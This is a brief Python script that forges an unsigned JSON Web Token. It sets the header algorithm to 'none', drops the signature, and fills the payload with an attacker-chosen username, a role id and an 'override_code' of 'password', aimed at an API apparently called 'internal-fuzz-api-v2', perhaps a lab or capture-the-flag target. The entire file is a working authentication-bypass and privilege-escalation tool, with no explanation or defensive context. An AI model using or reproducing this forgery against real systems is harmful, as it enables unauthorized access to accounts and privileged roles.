#!/usr/bin/env python3
import sys
import json
import base64

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

if len(sys.argv) != 3:
    sys.exit(1)

username = sys.argv[1]
role_id = int(sys.argv[2])

header = {"typ": "JWT", "alg": "none"}
payload = {
    "user": username,
    "role": role_id,
    "aud": "internal-fuzz-api-v2",
    "override_code": "password"
}

encoded_header = b64url_encode(json.dumps(header, separators=(',', ':')))
encoded_payload = b64url_encode(json.dumps(payload, separators=(',', ':')))

print(f"{encoded_header}.{encoded_payload}.")
